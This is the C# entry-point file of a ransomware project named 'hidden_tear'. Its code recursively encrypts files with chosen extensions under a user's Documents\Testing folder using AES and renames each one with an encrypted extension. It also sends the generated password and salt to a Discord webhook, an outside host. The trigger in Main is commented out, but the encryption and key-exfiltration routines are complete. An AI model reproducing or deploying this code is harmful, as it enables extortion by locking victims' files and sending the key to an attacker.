﻿using hidden_tear.Tools;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace hidden_tear
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            /*
            Task.Run(() =>
            {
                startAction();
            });
            */
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static void EncryptFile(string file, string password, string salt)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = Crypto.AES_Encrypt(bytesToBeEncrypted, passwordBytes,salt);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + Tools.Config.encryptedExtension);

        }

        //encrypts target directory
        static void encryptDirectory(string location, string password, string salt)
        {

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (Tools.Config.extensionToEncrypt.Contains(extension))
                {
                    EncryptFile(files[i], password, salt);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password,salt);
            }
        }

        static async void startAction()
        {
            string password = Crypto.CreatePassword(15);
            string salt = Crypto.CreateSalt(8);
            string path = "\\Documents\\Testing";
            string startPath = Config.userDir + Config.userName + path;
            await Logger.SendData(Config.DiscordWebhook,password, salt);
            encryptDirectory(startPath, password, salt);
        }
    }
}
